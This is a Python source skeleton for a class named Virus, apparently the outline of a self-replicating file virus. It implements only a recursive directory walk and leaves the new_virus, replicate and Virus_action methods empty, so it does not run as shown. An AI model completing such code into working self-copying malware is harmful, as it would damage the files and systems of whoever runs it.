import os       
import shutil   
import random   

class Virus:    #Define the base class Virus
    
    def __init__(self, path=None, target_dir=None, repeat=None):    
        self.path = path                                    
        self.target_dir = []                                
        self.repeat = 2                                     
        self.own_path = os.path.realpath(__file__)          
          
    def list_directories(self,path):                        
        self.target_dir.append(path)                        
        current_dir = os.listdir(path)                      
        
        for file in current_dir:                           
            if not file.startswith('.'):                    
                absolute_path = os.path.join(path, file)    
                print(absolute_path)                        

                if os.path.isdir(absolute_path):            
                    self.list_directories(absolute_path)    
                else:                                       
                    pass
    

    def new_virus(self):   









    def replicate(self):








    def Virus_action(self):                 #








  
if __name__=="__main__":
    current_directory = os.path.abspath("") #Fetch the current directory in which Virus.py file is present
    Virus = Virus(path=current_directory)   #Defining Object Virus for class Virus and setting the attribute path to current directory
    Virus.Virus_action()                    #Accessing class attribute and method through objects
